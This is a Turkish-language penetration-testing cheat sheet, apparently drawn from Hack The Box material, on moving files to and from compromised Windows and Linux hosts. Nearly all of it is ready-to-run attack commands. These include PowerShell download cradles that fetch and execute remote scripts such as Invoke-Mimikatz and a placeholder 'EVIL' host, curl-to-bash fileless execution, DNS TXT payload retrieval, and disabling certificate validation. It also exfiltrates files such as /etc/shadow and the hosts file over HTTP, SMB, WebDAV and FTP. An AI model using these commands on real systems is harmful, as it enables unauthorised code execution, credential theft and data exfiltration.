---
{"dg-publish":true,"permalink":"/cheat-sheet/file-transfer-cheat-sheet/"}
---




# WİNDOWS 


## Download  Operations

### 1- Base64 Encode - Decode ile File Transfer 

##### Adım 1 : Attack Host SSH Key MD5 Hash'ini Kontrol Et

```shell-session
$ md5sum id_rsa
```


##### Adım 2 : Atack Host SSH Anahtarını Base64'e Kodlama

```shell-session
 cat id_rsa |base64 -w 0;echo
```


##### Adım 3 : Hedef Windows Host'unda Base64 Decode

```powershell-session
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("Base64-Encodelanmış-Veri"))
```

##### Adım 4 : Hedef Windows Host'unda SSH Key MD5 Hash'ini Kontrol et 

```powershell-session
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```



### 2- PowerShell DownloadFile Method

##### 1- DownloadFile

```powershell-session

(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

```


##### 2- DownloadFileAsync

```powershell-session
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```



### 3- PowerShell DownloadString - Fileless Method

```powershell-session
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```


IEX ayrıca pipeline girdisini de kabul eder.

```powershell-session
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### 4- PowerShell Invoke-WebRequest

```powershell-session
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```


### 5- Normal Download Cradle

```powershell-session
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
```


### 6- PowerShell 3.0+ İçin Basit Yöntem

```powershell-session
IEX (iwr 'http://EVIL/evil.ps1')
```


### 7- Internet Explorer (IE) COM Nesnesi ile Gizli İndirme

```powershell-session
$h = New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://EVIL/evil.ps1',$false);
$h.send();
iex $h.responseText
```


### 8- WinHttp COM Nesnesi ile İndirme

```powershell-session
$h = new-object -com WinHttp.WinHttpRequest.5.1;
$h.open('GET','http://EVIL/evil.ps1',$false);
$h.send();
iex $h.responseText
```


### 9- Bits Transfer ile İndirme (Disk Kullanır)

```powershell-session
Import-Module bitstransfer;
Start-BitsTransfer 'http://EVIL/evil.ps1' $env:temp\t;
$r = gc $env:temp\t;
rm $env:temp\t;
iex $r
```

### 10 - DNS TXT Kayıtları ile İndirme

```powershell-session
IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(((nslookup -querytype=txt "SERVER" | Select-String -Pattern '"*"') -split '"')[0])))
```


### 11- XML ile Komut Almak

```powershell-session
$a = New-Object System.Xml.XmlDocument
$a.Load("https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt")
$a.command.a.execute | iex
```


### 12- Internet Explorer düzgün başlatılmamış veya yapılandırılmamışsa

```powershell-session
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

### 13- SSL/TSL Sertifika Hataları Atlama 
```powershell-session

PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

```


### 14- SMB İle File Transfer (Kimliksiz)

##### 1- Create the SMB Server

```shell-session
impacket-smbserver share -smb2support /tmp/smbshare
```


##### 2- SMB Sunucusundan Bağlanma ve Dosya Kopyalama

```cmd-session
net use Z: \\192.168.220.28\share
```

```cmd-session
copy \\192.168.220.133\share\nc.exe
```



### 15-  SMB İle File Transfer (Kimlik Bilgileriyle)

##### 1- Create the SMB Server

```shell-session
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```


##### 2-**SMB Sunucusunu Kullanıcı Adı ve Parola ile Mount Etme** ve İndirme

```cmd-session
net use n: \\192.168.220.133\share /user:test test
```

```cmd-session
copy n:\nc.exe
```


### 16- FTP ile File Transfer 


##### 1-  Installing the FTP Server Python3 Module - pyftpdlib
```shell-session
sudo pip3 install pyftpdlib
```

##### 2- Python3 FTP Sunucusu Kurma

```shell-session
sudo python3 -m pyftpdlib --port 21
```

##### 3- PowerShell Kullanarak FTP Sunucusundan Dosya Aktarma

```powershell-session
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

##### 4-**FTP Client için bir Komut Dosyası Oluşturun ve Hedef Dosyayı İndirin** Etkileşimli bir Shell olmadığında

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye
```



## Upload Operations

### 1-  PowerShell Base64 Encode & Decode

##### 1- Encode File Using PowerShell

```powershell-session
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

##### 2-Decode Base64 String in Linux

```shell-session
echo IyBDb3B5cm...SNIP....0DQo= | base64 -d > hosts
```

```shell-session
md5sum hosts 
```



### 2- PowerShell Web Uploads

##### 1- Upload ile Yapılandırılmış Web Server Kurulumu ve Kullanımı

```shell-session
pip3 install uploadserver
```

```shell-session
python3 -m uploadserver
```

##### 2- Python Upload Server'a Dosya Yüklemek için PowerShell Script

```powershell-session
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

```powershell-session
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```


### 3-PowerShell Base64 Web Upload

##### 1- **Base64 Kodlama Komutu**:
```powershell-session
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```

##### 2-**Web İsteği Gönderme Komutu**:
```powershell-session
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

##### 3- Attack Host 
```shell-session
nc -lvnp 8000
```

```shell-session
echo <base64> | base64 -d -w 0 > hosts
```


### 3-SMB Uploads (WebDav ile)

##### 1- Configuring WebDav Server

```shell-session
sudo pip3 install wsgidav cheroot
```

##### 2-**WebDav Python modülünü kullanma**

```shell-session
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
```

##### 3-**Webdav Paylaşımına Bağlanma**

```cmd-session
dir \\192.168.49.128\DavWWWRoot
```

Sunucuya bağlanırken sunucunuzda var olan bir klasörü belirtirseniz bu anahtar sözcüğü kullanmaktan kaçınabilirsiniz. Örneğin: \192.168.49.128\sharefolder


##### 4-Uploading Files using SMB

```cmd-session
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```


### 4-FTP Uploads


##### 1- Python3 FTP Sunucusu Kurma (--write)

```shell-session
sudo python3 -m pyftpdlib --port 21 --write
```

##### 2- PowerShell Upload File

```powershell-session
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```


##### 3-**FTP Client için bir Komut Dosyası Oluşturun ve Hedef Dosyayı Yükleyin** Etkileşimli bir Shell olmadığında

```cmd-session
echo open 192.168.49.128 > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt

ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```



# Linux

## Download  Operations

### 1-**Base64 Kodlama / Kod Çözme**  

##### 1-Check File MD5 hash

```shell-session
md5sum id_rsa
```

##### 2-Encode SSH Key to Base64

```shell-session
cat id_rsa |base64 -w 0;echo
```

##### 3-Linux - Decode the File

```shell-session
echo -n 'LS0tLS1CR..SNIP..S0tLQo=' | base64 -d > id_rsa
```

##### 4- Linux - Confirm the MD5 Hashes Match

```shell-session
md5sum id_rsa
```


### 2-**Wget ve cURL ile Web İndirmeleri**

##### 1-**wget Kullanarak Dosya İndirme**

```shell-session
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

##### 2-**cURL Kullanarak Dosya İndirme**

```shell-session
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```


### 3-**Linux Kullanarak Fileless Saldırıları**

##### 1-Fileless Download with cURL

```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```


##### 2-Fileless Download with wget

```shell-session
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```


### 4-**Bash ile indirme (/dev/tcp)**

##### 1-**Hedef Web Sunucusuna Bağlanın**

```shell-session
$ exec 3<>/dev/tcp/10.10.10.32/80
```

##### 2-HTTP GET Request

```shell-session
$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

##### 3-Print the Response

```shell-session
$ cat <&3
```




### 5- SSH Downloads

##### 1-**SSH Sunucusunu Etkinleştirme**

```shell-session
sudo systemctl enable ssh
```

##### 2-Starting the SSH Server

```shell-session
sudo systemctl start ssh
```

##### 3-Checking for SSH Listening Port

```shell-session
netstat -lnpt
```

##### 4-Linux - Downloading Files Using SCP

```shell-session
scp plaintext@192.168.49.128:/root/myroot.txt . 
```



## Upload Operations


### 1-Web Upload

##### 1-Attack Linux - Start Web Server

```shell-session
sudo python3 -m pip install --user uploadserver
```

##### 2-Create a Self-Signed Certificate
```shell-session
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

##### 3-Start Web Server

```shell-session
mkdir https && cd https
```

```shell-session
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```


##### 4-Linux - Upload Multiple Files

```shell-session
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```


### 2-**Alternatif Web Dosya Aktarım Yöntemi**


##### 1-Linux - Creating a Web Server with Python3

```shell-session
python3 -m http.server
```

##### 2-Linux - Creating a Web Server with Python2.7

```shell-session
python2.7 -m SimpleHTTPServer
```

##### 3-Linux - Creating a Web Server with PHP

```shell-session
php -S 0.0.0.0:8000
```

##### 4-Linux - Creating a Web Server with Ruby

```shell-session
ruby -run -ehttpd . -p8000
```

##### 5-**Dosyayı Hedef Makineden İndirin**

```shell-session
wget 192.168.49.128:8000/filetotransfer.txt
```


### 3-SCP Upload

```shell-session
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```
